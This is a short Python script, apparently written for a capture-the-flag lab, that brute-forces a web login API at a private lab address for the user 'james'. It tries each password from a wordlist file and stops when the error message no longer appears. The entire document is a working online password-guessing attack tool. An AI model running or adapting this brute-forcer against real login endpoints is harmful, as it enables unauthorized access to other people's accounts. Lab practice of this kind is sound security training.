#!/usr/bin/python3

# Slow, but i don't want to be a script kiddie :)

import grequests
import sys

passwords = [ x.strip() for x in open('wordlist.txt') if x ]

def Login(password):
	data = {"username":"james","password":password}
	
	response = grequests.post('http://10.10.91.67/api/user/login', data=data)
	responses_list = grequests.map([response])
	
	print("Trying Password#" + str(number) + ": " + password)

	if "Invalid Username Or Password" not in responses_list[0].text:
		print("Password Found: " + password)
		sys.exit(0)
		
for number,password in enumerate(passwords):
	Login(password)
